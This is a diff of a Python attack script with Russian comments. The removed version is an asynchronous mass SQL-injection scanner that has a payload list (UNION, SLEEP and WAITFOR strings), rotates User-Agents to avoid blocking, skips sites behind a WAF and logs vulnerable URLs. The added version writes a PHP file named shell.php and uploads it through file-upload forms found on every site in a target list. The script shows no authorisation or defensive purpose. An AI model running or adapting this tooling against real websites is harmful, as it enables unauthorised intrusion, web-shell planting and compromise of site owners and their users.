@@ -1,109 +1,99 @@
 import aiohttp
 import asyncio
-import random
-import time
-from urllib.parse import urlparse, parse_qs, urlencode
 from bs4 import BeautifulSoup
-from tqdm import tqdm
+import os
+from random import choice
+from urllib.parse import urljoin
 
-# Читаем список URL
-with open("sites.txt", "r") as file:
-    urls = [line.strip() for line in file if line.strip()]
+# Готовим файл для теста
+payload_file = "shell.php"
+with open(payload_file, 'w') as f:
+    f.write("<?php phpinfo(); ?>")  # Простой PHP код для теста
 
-# SQL-инъекционные пейлоады
-sql_payloads = [
-    "'", "\"", "' OR '1'='1' --", "\" OR \"1\"=\"1\" --", "' OR 1=1 --", 
-    "' UNION SELECT 1,2,3 --", "' AND SLEEP(5) --", "' AND 1=CONVERT(int, SLEEP(5)) --", 
-    "'; WAITFOR DELAY '0:0:5' --", "' OR 1 GROUP BY CONCAT(0x7e,user(),0x7e,FLOOR(RAND(0)*2)) HAVING COUNT(*)>1 --"
-]
-
-# User-Agents для обхода блокировок
+# Список User-Agent'ов для обхода блокировок
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1"
 ]
 
-async def detect_waf(session, url):
-    """Определение WAF (Cloudflare, ModSecurity и т. д.)"""
+# ANSI Escape Codes для цвета
+GREEN = "\033[92m"
+RED = "\033[91m"
+RESET = "\033[0m"
+
+# Функция для асинхронного сканирования сайта
+async def scan_for_file_upload(session, url):
     try:
-        async with session.get(url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=5) as response:
-            headers = response.headers
-            if "server" in headers and ("cloudflare" in headers["server"].lower() or "sucuri" in headers["server"].lower()):
-                print(f"\033[93m[⚠] WAF обнаружен на {url}\033[0m")
-                return True
-    except:
-        pass
-    return False
+        headers = {'User-Agent': choice(USER_AGENTS)}
 
-async def check_sql_injection(session, base_url, param, original_value, progress_bar):
-    """Тестирование SQL-инъекций"""
-    for payload in sql_payloads:
-        test_url = f"{base_url}?{urlencode({param: original_value + payload})}"
-        progress_bar.set_description(f"\033[94m[🔍] Тест: {param} -> {payload[:10]}...\033[0m")
+        # Выполняем GET-запрос с заголовками
+        async with session.get(url, headers=headers) as response:
+            if response.status != 200:
+                print(f"[{url}] Ошибка получения страницы: {response.status}")
+                return
 
-        try:
-            start_time = time.time()
-            async with session.get(test_url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=10) as response:
-                text = await response.text()
-                response_time = time.time() - start_time
+            # Парсим HTML страницы
+            soup = BeautifulSoup(await response.text(), 'html.parser')
+            forms = soup.find_all('form')
 
-                # Проверяем ошибки SQL
-                if any(error in text.lower() for error in ["sql syntax", "mysql_fetch", "odbc", "sqlstate", "error in your sql"]):
-                    print(f"\033[91m[🔥] SQL-инъекция найдена! {test_url}\033[0m")
-                    with open("vulnerable_sites.txt", "a") as vuln_file:
-                        vuln_file.write(test_url + "\n")
-                    return
+            # Проверка на наличие формы с файлом
+            for form in forms:
+                file_input = form.find('input', {'type': 'file'})
+                if file_input:
+                    # Пытаемся найти точку загрузки
+                    action_url = form.get('action')
+                    full_action_url = urljoin(url, action_url) if action_url else url
+                    print(f"Найдена форма с загрузкой файлов на странице: {url}")
+                    result = await try_upload_file(session, full_action_url, payload_file)
+                    if result == "ДА":
+                        print(f"{url} - {GREEN}ЗАГРУЖЕН ФАЙЛ: {result}{RESET}")
+                    else:
+                        print(f"{url} - {RED}ЗАГРУЖЕН ФАЙЛ: {result}{RESET}")
+                    return  # Если файл загружен, можно прекратить обработку этой формы.
 
-                # Проверяем Time-Based инъекции
-                if response_time > 4:
-                    print(f"\033[95m[⏳] Время ответа подозрительное: {test_url}\033[0m")
-                    with open("vulnerable_sites.txt", "a") as vuln_file:
-                        vuln_file.write(test_url + "\n")
-                    return
-        except:
-            pass
+    except Exception as e:
+        print(f"Ошибка при обработке сайта {url}: {str(e)}")
 
-async def scan_site(session, url, progress_bar):
-    """Сканирование одного сайта"""
-    if await detect_waf(session, url):
-        print(f"\033[91m[⛔] Пропущен {url} (WAF обнаружен)\033[0m")
+# Попытка загрузить PHP файл
+async def try_upload_file(session, action_url, payload_file):
+    try:
+        # Проверка, если URL действует для загрузки
+        print(f"Попытка загрузки на {action_url}...")
+        async with aiohttp.ClientSession() as upload_session:
+            with open(payload_file, 'rb') as file:
+                files = {'file': (payload_file, file, 'application/x-php')}
+                async with upload_session.post(action_url, data=files) as upload_response:
+                    if upload_response.status == 200:
+                        # Проверим, был ли файл успешно загружен
+                        if 'php' in await upload_response.text():
+                            return "ДА"
+                        else:
+                            return "НЕТ"
+                    else:
+                        return f"Ошибка при загрузке: {upload_response.status}"
+    except Exception as e:
+        return f"Ошибка при загрузке на {action_url}: {str(e)}"
+
+# Основная функция для сканирования всех сайтов
+async def scan_sites_from_file(file_path):
+    if not os.path.exists(file_path):
+        print(f"Файл {file_path} не найден.")
         return
 
-    parsed_url = urlparse(url)
-    params = parse_qs(parsed_url.query)
+    # Чтение URL из файла
+    with open(file_path, 'r') as file:
+        urls = [line.strip() for line in file.readlines()]
 
-    if not params:
-        print(f"\033[93m[⚠] {url} - нет URL-параметров, ищем формы...\033[0m")
-        try:
-            async with session.get(url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=10) as response:
-                text = await response.text()
-                soup = BeautifulSoup(text, "html.parser")
+    # Асинхронная сессия
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        for url in urls:
+            tasks.append(scan_for_file_upload(session, url))
 
-                # Поиск форм
-                forms = soup.find_all("form")
-                for form in forms:
-                    inputs = form.find_all("input")
-                    for inp in inputs:
-                        if inp.get("name"):
-                            param_name = inp.get("name")
-                            print(f"\033[96m[🔍] Найден скрытый параметр: {param_name}\033[0m")
-                            await check_sql_injection(session, url, param_name, "1", progress_bar)
-        except:
-            pass
-        return
+        # Параллельное выполнение всех задач
+        await asyncio.gather(*tasks)
 
-    print(f"\033[92m[🔍] Проверяем {url} ({len(params)} параметров)...\033[0m")
-    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
-    tasks = [check_sql_injection(session, base_url, param, values[0], progress_bar) for param, values in params.items()]
-    await asyncio.gather(*tasks)
-
-async def main():
-    with tqdm(total=len(urls), desc="\033[92m[🚀] Сканирование сайтов...\033[0m", unit=" сайт") as progress_bar:
-        async with aiohttp.ClientSession() as session:
-            tasks = [scan_site(session, url, progress_bar) for url in urls]
-            await asyncio.gather(*tasks)
-            progress_bar.update(len(urls))
-
-# Запуск
-asyncio.run(main())
+# Запуск асинхронного сканирования
+file_path = "sites.txt"  # Путь к файлу с сайтами
+asyncio.run(scan_sites_from_file(file_path))
